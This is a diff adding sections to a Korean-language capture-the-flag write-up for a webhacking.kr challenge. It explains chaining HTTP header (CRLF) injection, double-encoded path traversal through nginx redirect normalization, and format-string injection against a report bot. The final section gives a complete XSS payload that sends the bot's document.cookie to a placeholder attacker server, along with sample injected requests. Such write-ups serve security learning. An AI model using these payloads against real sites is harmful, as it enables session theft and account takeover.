@@ -146,3 +146,44 @@ cookie를 base64 인코딩해서 넣어주면 alert창이 성공적으로 뜬다
 하지만, 이 접근방식은 쿠키를 수정해야되는데, report 페이지 봇의 쿠키를 어떻게 수정할 수 있을까?  
 이전에도 자주 등장한 HTTP Header Injection을 사용하면 된다.  
 
+### HTTP Header Injection
+우리의 목표는 report 봇의 쿠키를 인젝션하고 메인페이지에 접속하도록 해야한다.  
+burp로 메인페이지에서의 통신을 잡아보면, 클라이언트가 `favicon.ico`를 루트 경로에서 요청했지만, 실제 파일의 위치가 `/static/` 디렉토리에 있다.  
+따라서, 서버는 클라이언트에게 새로운 위치로 리다이렉트하도록 `Location` 헤더를 지정해서 응답했다.  
+브라우저는 이 응답을 받은 후, 자동으로 `Location` 헤더에 명시된 새 URL로 다시 요청을 보낸다.  
+
+이런 리다이렉트 응답에 `Set-Cookie` 헤더를 인젝션한다면, repost 봇의 쿠키가 수정될 것이다.  
+
+```
+// Request
+GET /favicon.ico%0d%0aSet-Cookie:memo=123123123 HTTP/1.1
+
+// Response
+Location: http://webhacking.kr:10013/static/favicon.ico
+Set-Cookie:memo=123123123
+```
+HTTP Header Injection이 성공적으로 이루어졌다.  
+이제 report 봇이 메인 페이지에 접속만 하면 된다.  
+
+### URL Normalization Path Traversal
+서버 설정에서 한 가지 흥미로운 점은 `/favicon.ico`로 시작하는 모든 요청을 매칭하여, 매칭된 요청에 대해 `/static`을 앞에 붙여서 리다이렉트 한다는 점이다.  
+`/favicon.ico` 뒤에 어떤 문자열을 붙여도 서버는 이를 그대로 리다이렉트 해준다.  
+
+이 점을 이용해서 path traversal을 일으킬 수 있다.  
+```
+// Request
+GET /favicon.ico%2f..%252f..%252f HTTP/1.1
+
+// Response
+Location: http://webhacking.kr:10013/static/favicon.ico/..%2f..%2f
+```
+요청을 `..%252f..%252f`로 더블 인코딩해서 보내면, nginx 서버가 이를 한 번 디코딩해서 `..%2f..%2f`로 리다이렉트 응답을 해준다.  
+브라우저는 인코딩 되어 있는 경로를 문자열로 인식하고 그대로 리다이렉션을 요청하며,  
+nginx 서버는 이를 다시 디코딩 하여 최종적으로 `/static/favicon.ico/../../` 루트 경로에 접근이 가능하다.  
+
+### 최종 페이로드
+Format String Injection과 HTTP Header Injection, URL Normalization Path Traversal을 모두 사용하여 최종 페이로드를 구성할 수 있다.  
+
+```
+favicon.ico%2f..%252f..%252f%0d%0aSet-Cookie:memo={base64(["%c><img src=1 onerror=location.href='{SERVER.COM}?'+document.cookie></img>","39"])}
+```
